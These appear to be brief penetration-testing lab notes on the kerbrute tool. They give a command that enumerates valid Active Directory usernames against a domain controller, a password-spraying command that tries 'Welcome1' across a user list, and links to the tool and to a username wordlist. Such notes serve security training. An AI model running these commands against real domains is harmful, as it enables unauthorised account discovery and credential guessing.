
[https://github.com/ropnop/kerbrute/releases/latest](https://github.com/ropnop/kerbrute/releases/latest)

Enumeration
```
./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

Password Spraying
```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

User wordlist
[https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)